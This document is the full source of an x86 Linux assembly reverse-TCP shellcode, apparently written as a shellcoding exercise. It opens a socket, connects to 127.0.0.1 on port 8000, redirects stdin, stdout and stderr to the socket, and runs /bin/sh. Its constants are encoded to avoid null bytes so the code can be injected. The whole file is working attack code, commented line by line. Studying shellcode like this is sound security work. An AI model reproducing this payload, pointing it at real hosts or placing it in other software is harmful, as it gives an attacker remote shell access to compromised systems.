;shell_reverse_tcp
;Author: buffered4ever
;15-03-2019

; /usr/include/i386-linux-gnu/asm/unistd_32.h
; /usr/include/linux/in.h  IPPROTO_IP = 0, /* Dummy protocol for TCP */
; /usr/include/bits/socket_type.h SOCK_STREAM = 1
; /usr/include/bits/socket.h: #define AF_INET  2
; /usr/include/linux/in.h #define INADDR_LOOPBACK 0x7f000001 /* 127.0.0.1   */
global _start
section .text
_start:
	; sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	; int socketcall(int call, unsigned long *args);	
	; #define SYS_SOCKET	1
	xor edx, edx; flushing edx
	push edx ; pushing third argument IPPROTO_IP//0
	push byte 1 ; SOCKSTREAM tcp//1
	push byte 2 ; AF_INET// 2
	mov ecx, esp ;  address of the arguments of sys_socket
	xor eax, eax ; flushing eax
	mov al, 102 ; #define __NR_socketcall 102
	xor ebx, ebx ; flushing ebx
	mov bl, 1 ;  #define SYS_SOCKET    1
	int 0x80 ; syscall
	mov edi, eax ; storing the value of sockfd into edi for later use


	; mysockaddr.sin_family = AF_INET; //2
        ; mysockaddr.sin_port = htons(dstport); //8000
        ; mysockaddr.sin_addr.s_addr = inet_addr("127.0.0.1"); //localhost
	; ret = connect(sockfd, (struct sockaddr *) &mysockaddr, sizeof(struct sockaddr_in));
	; int socketcall(int call, unsigned long *args);
	xor ebx, ebx ; flushing ebx
	;#define INADDR_LOOPBACK 0x7f000001 /* 127.0.0.1   */
	mov ebx, 0x12111190 ; to avoid null in IP address
	sub ebx, 0x11111111
	push ebx ; 0x0100007f
	push word 0x401f ; 8000
	push word 2 ; AF_INET//2
	mov ebx, esp ; address of mysockaddr
	push byte 16 ; sizeof(mysockaddr)//16
	push ebx ; push address of mysockaddr
	push edi ; sockfd
	mov ecx, esp ; address of connect
	xor ebx, ebx ; flushing ebx
	mov bl, 3 ; #define SYS_CONNECT 3
	xor eax, eax ; flushing eax
	mov al, 102 ; #define __NR_socketcall 102
	int 0x80 ; syscall

	; dup2(sockfd, 0);
        ; dup2(sockfd, 1);
        ; dup2(sockfd, 2);
	;#define __NR_dup2 63
	mov ebx, edi ; sockfd
	xor ecx, ecx ; flushing ecx
	mov cl, 2 ;  2 for stderr / 1 for stdout / 0 for stdin
dup2loop:
	mov al, 63 ; #define __NR_dup2 63
	int 0x80 ; syscall
	dec ecx ; decrement ecx
	jns dup2loop ; jump if not signed; loop until cl becomes 0

	
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	; execve("/bin/sh", NULL, NULL);
	; push NULL terminated program/file name
	xor eax, eax ; flushing eax
	push eax ; NULL
	; push //bin/sh
	push 0x68732f6e ; hs/n
	push 0x69622f2f ; nib//

	mov ebx, esp ; address of //bin/sh 

	mov edx, eax ; NULL third argument

	mov ecx, eax ; NULL second argument

	mov al, 0xb ; #define __NR_execve 11
	int 0x80
